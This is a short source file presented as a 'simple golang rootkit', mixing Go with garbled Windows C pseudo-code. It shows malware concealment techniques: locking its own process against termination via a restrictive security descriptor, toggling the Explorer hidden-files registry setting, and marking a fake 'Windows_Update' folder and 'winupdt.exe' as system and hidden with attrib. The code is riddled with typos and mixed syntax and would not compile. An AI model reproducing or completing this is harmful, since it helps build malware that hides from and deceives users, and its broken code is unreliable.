/*
  * A simplegolang rootkit package
*/

import (
  "fmt"
  "os/exec"
)

func Croc()bool{
  HANDLE proc OpenProcess(PROCESS_ALL_ACCESS,FALSE,getCurrPid())
  SECURITY_ATTRIBUTE struct sa
  TCHAR*szSD = TEXT("D:P")
  TEXT stuff
  sa.Length sizeof(sa)
  sa.InheriHandle = false
  if (!ConStringSecDescToSecDescr(szSD,SDDL_REVISION_!,&(sa.lpSEcDescr),NULL)){
    return false
  }
  if(!SetKernelObjectSecurity(proc,DACL_SECURITY_INFORMATION,sa.lpSEcDescr)){
    return false
  }
  return true
}

func HideFiles(
  HKEy nv
  REgOpenKey(HKEY_CURRENT_USER,"some_string",&nv)
  var n int;n = 2;
  char* a = (char*)&n
  RegSetValEx9nv,"Hidden",0,REG_DWORD,a,sizeof(a)

)

func Install(){
  go rk.Croc()//selfdefence
  go rk.NSA("some string",true)//watch reg
  go rk.NSA("some string",false)
  go Raptor()
}

func Raptor(){
  RunCommand("attrib +S +H %APPDATA%\\Windows_Update")
  RunCommand("attrib +S +H %APPDATA\\Windows_Update\\winupdt.exe")
}

func RunCommand(cmd string){
  exec.Command("cmd","/C",cmd).Run()
}
